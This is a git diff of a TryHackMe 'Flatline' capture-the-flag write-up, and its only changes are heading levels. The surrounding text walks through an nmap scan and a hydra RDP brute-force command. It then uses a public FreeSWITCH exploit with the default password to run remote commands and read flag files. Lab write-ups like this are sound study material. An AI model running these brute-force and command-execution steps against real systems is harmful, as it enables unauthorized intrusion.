@@ -2,7 +2,7 @@
 
 Room link: https://tryhackme.com/room/flatline
 
-# Scanning
+## Scanning
 I ran an full nmap scan with ping disabled after it didnt allow me to run a scan. 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nmap -p- -Pn [Remote IP]
@@ -58,7 +58,7 @@ I started up hydra to brute force a log in with RDP to see what would happen.
 ```
 hydra -L /home/ajread/resources/wordlists/SecLists/Usernames/Names/names.txt -P /home/ajread/resources/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt [Remote IP]rdp
 ```
-# Enumeration
+## Enumeration
 However, it didnt work so I decided to go after the more interesting FreeSwitch service. I found a possible exploitiation with command execution (https://www.exploit-db.com/exploits/47799). According to the exploit, FreeSwitch allow commands to be run after proper authentication. The default password for the service is ```ClueCon```. So, I renamed the exploit to ```freeswitch.py``` and connected to the service with the below command. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] whoami
@@ -69,7 +69,7 @@ Content-Length: 25
 win-eom4pk0578n\nekrotic
 ```
 Therefore, I was able to run any command that I wanted with the ```freeswitch.py``` script that authenticated my socket with the remote service. Looking at the output of ```whoami```, I appear to be running as user on the system. 
-# Initial Access
+## Initial Access
 I had to do some digging around. But, I eventually found the location of the ```user.txt```. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "type C:\Users\Nekrotic\Desktop\user.txt"
@@ -79,7 +79,7 @@ Content-Length: 38
 
 [REDACTED]
 ```
-# Privilege Escalation 
+## Privilege Escalation 
 Within the desktop directory of the user, I noticed a ```root.txt```. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ python3 freeswitch.py [Remote IP] "dir C:\Users\Nekrotic\Desktop"
